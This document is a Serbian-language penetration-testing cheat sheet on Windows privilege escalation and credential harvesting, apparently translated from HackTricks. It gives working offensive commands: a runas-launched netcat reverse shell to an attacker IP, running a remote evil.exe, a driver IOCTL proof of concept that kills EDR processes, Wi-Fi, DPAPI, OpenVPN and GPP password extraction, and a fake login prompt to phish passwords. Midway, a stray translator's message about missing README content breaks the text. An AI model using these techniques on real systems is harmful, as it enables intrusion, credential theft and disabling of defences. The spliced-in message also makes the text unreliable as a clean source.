## Applications

### Installed Applications

Proverite **dozvole binarnih fajlova** (možda možete prepisati neki i izazvati privilege escalation) i **dozvole foldera** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neki konfiguracioni fajl da biste pročitali neki poseban fajl ili da li možete izmeniti neki binarni fajl koji će biti izvršen od strane Administrator naloga (schedtasks).

Jedan način da pronađete slabe dozvole za foldere/fajlove u sistemu je da uradite:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistencija/izvršavanje

Notepad++ automatski učitava bilo koji plugin DLL iz svojih `plugins` podfoldera. Ako je prisutna prenosiva/kopirana instalacija sa mogućnošću upisa, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain` i plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Proverite da li možete prepisati neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Potražite moguće **third party neobične/ranjive** drivere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako driver izlaže arbitrary kernel read/write primitive (common u poorly designed IOCTL handlers), možete eskalirati krađom SYSTEM token‑a direktno iz kernel memorije. Pogledajte step‑by‑step tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Za race-condition bagove gde vulnerable call otvara attacker-controlled Object Manager path, namerno usporavanje lookup‑a (korišćenjem max-length components ili deep directory chains) može produžiti prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderni hive vulnerabilities omogućavaju vam da groom-ujete deterministic layouts, zloupotrebite writable HKLM/HKU descendants, i konvertujete metadata corruption u kernel paged-pool overflows bez custom driver‑a. Saznajte ceo lanac ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Neki signed third‑party drivers kreiraju njihov device object sa jakim SDDL putem IoCreateDeviceSecure, ali zaborave da podese FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ovog flag‑a, secure DACL se ne primenjuje kada se device otvori kroz path koji sadrži dodatnu komponentu, omogućavajući bilo kojem neprivilegovanom korisniku da dobije handle koristeći namespace path kao:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Kada korisnik može da otvori device, privileged IOCTLs izloženi od strane driver‑a mogu biti zloupotrebljeni za LPE i tampering. Primeri mogućnosti viđenih u prirodi:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigacije za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja device objekata koji treba da budu ograničeni DACL-om.
- Validirajte kontekst pozivaoca za privileged operations. Dodajte PP/PPL provere pre dozvoljavanja terminacije procesa ili vraćanja handle-a.
- Ograničite IOCTLs (access masks, METHOD_*, input validation) i razmotrite brokered modele umesto direktnih kernel privileges.

Ideje za detekciju za odbrambene timove
- Pratite user-mode otvaranja sumnjivih device imena (npr. \\ .\\amsdk*) i specifičnih IOCTL sekvenci indikativnih za zloupotrebu.
- Sprovodite Microsoft-ovu vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i održavajte svoje allow/deny liste.


## PATH DLL Hijacking

Ako imate **write permissions inside a folder present on PATH**, možete da hijack a DLL loaded by a process i **escalate privileges**.

Proverite dozvole svih foldera unutar PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li su u hosts file hardkodirani drugi poznati računari
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite da li su **ograničene usluge** dostupne spolja.
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(prikaži pravila, kreiraj pravila, isključi, isključi...)**

Više[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binarnu datoteku `bash.exe` takođe možete pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user možete slušati na bilo kom portu (prvi put kada koristite `nc.exe` да slušate на portu pojaviće se upit putem GUI да ли `nc` треба да буде dozvoljen кроз firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete probati `--default-user root`

Možete istražiti `WSL` fajl sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows kredencijali

### Winlogon kredencijali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadžer kredencijala / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke kredencijale za servere, web sajtove i druge programe za koje **Windows** može **automatski prijaviti korisnike**y. Na prvi pogled, može izgledati kao da korisnici sada mogu sačuvati svoje Facebook credentials, Twitter credentials, Gmail credentials itd., tako da se automatski prijavljuju putem pretraživača. Ali nije tako.

Windows Vault čuva kredencijale koje Windows može koristiti za automatsko prijavljivanje korisnika, što znači da bilo koja **Windows application that needs credentials to access a resource** (server ili web sajt) **can make use of this Credential Manager** & Windows Vault i koristi dostavljene kredencijale umesto da korisnici stalno unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager, ne verujem da je moguće da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, treba na neki način da **communicate with the credential manager and request the credentials for that resource** iz podrazumevanog storage vault-a.

Koristite `cmdkey` da izlistate sačuvane kredencijale na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane kredencijale. Sledeći primer poziva udaljeni binarni fajl preko SMB share-a.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa dostavljenim setom credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** pruža metodu za simetričnu enkripciju podataka, uglavnom korišćenu u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisnički ili sistemski tajni podatak koji značajno doprinosi entropiji.

**DPAPI omogućava enkripciju ključeva putem simetričnog ključa koji je izveden iz korisnikovih podataka za prijavu**. U scenarijima sistemske enkripcije, koristi sistemske domenske autentifikacione tajne.

Šifrovani korisnički RSA ključevi, korišćenjem DPAPI, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa master ključem koji štiti korisnikove privatne ključeve u istom fajlu**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što onemogućava listanje njegovog sadržaja pomoću komande `dir` u CMD, iako se može listati putem PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) да га dešifrujete.

The **credentials files protected by the master password** are usually located in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** koristeći `sekurlsa::dpapi` modul (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao način za praktično čuvanje šifrovanih kredencijala. Kredencijali su zaštićeni korišćenjem **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste **dešifrovali** PS credentials iz fajla koji ga sadrži, možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Možete **izvući mnoge DPAPI masterkeys** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula

### Sticky Notes

Ljudi često koriste StickyNotes aplikaciju na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to fajl baze podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti i pregledati.

### AppCmd.exe

**Napomena: za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga pod High Integrity level.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\  
Ako ovaj fajl postoji, moguće je da su neke **credentials** konfigurisane i mogu biti **oporavljene**.

Ovaj kod je izvučen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri se **pokreću sa SYSTEM privileges**, mnogi su podložni **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Datoteke i Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys u registru

SSH private keys mogu biti smešteni u ključu Windows registra `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li se tamo nalazi nešto zanimljivo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos u tom direktorijumu, verovatno je u pitanju sačuvan SSH ključ. On je pohranjen kriptovano, ali se lako može dešifrovati koristeći [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri pokretanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se preko ssh na mašinu. Registry HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom asimetrične autentifikacije ključa.

### Datoteke ostavljene bez nadzora
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove datoteke koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rezervne kopije
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud kredencijali
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite fajl pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Funkcija je ranije postojala koja je omogućavala deploy custom lokalnih administrator naloga na grupu mašina putem Group Policy Preferences (GPP). Međutim, ova metoda je imala značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji su pohranjeni kao XML fajlovi u SYSVOL, mogli su biti pristupljeni od strane bilo kog domain korisnika. Drugo, lozinke unutar ovih GPP-ova, enkriptovane AES256 koristeći javno dokumentovan default key, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. Ovo je predstavljalo ozbiljan rizik, jer je omogućavalo korisnicima dobijanje povišenih privilegija.

Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Nakon pronalaska takvog fajla, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat uključuje detalje o GPP-u i lokaciji fajla, pomažući u identifikaciji i sanaciji ove bezbednosne ranjivosti.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dekriptovanje cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer fajla web.config sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatražite credentials

Uvek možete **zatražiti od korisnika da unese svoje credentials ili čak credentials drugog korisnika** ako mislite da ih može znati (imajte na umu da je **zatraživanje** klijenta direktno za **credentials** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže kredencijale**

Poznati fajlovi koji su pre nekog vremena sadržali **lozinke** u **clear-text** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Niste priložili sadržaj fajla src/windows-hardening/windows-local-privilege-escalation/README.md. Pošaljite sadržaj tog README.md (ili ceo tekst koji treba da prevedem), pa ću ga prevesti na srpski uz očuvanje svih markdown/HTML tagova, linkova, putanja i koda kako ste tražili.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Takođe bi trebalo da proverite Bin kako biste pronašli credentials u njemu

Za **oporavak lozinki** koje su sačuvane od strane više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Drugi mogući registry ključevi koji sadrže credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pretraživača

Treba da proverite dbs u kojima su sačuvane passwords iz **Chrome or Firefox**.\
Takođe proverite istoriju, bookmarks i favourites pregledača jer možda su neke passwords sačuvane tamo.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operating system koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih u različitim jezicima. Svaka COM komponenta je **identifikovana putem class ID (CLSID)** i svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih putem interface IDs (IIDs).

